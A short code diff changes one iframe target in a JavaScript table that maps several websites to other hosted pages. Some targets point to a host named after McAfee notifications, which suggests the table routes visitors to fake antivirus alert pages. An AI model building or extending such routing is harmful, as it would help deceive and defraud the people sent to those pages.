@@ -71,7 +71,7 @@ const ORIGIN_GROUPS = {
     "https://relaxed-pegasus-8e3b77.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
   },
   dmc: {
-    "https://miyabikinjp.dqwzavw2upc3z.amplifyapp.com": { method: "iframe", target: "https://voluble-boba-225b49.netlify.app" },
+    "https://miyabikinjp.dqwzavw2upc3z.amplifyapp.com": { method: "iframe", target: "https://verdant-dragon-f23a38.netlify.app" },
   },
   aomine: {
     "https://zen-hawellness.life": { method: "iframe", target: "https://mcafeenotifications.onrender.com" },
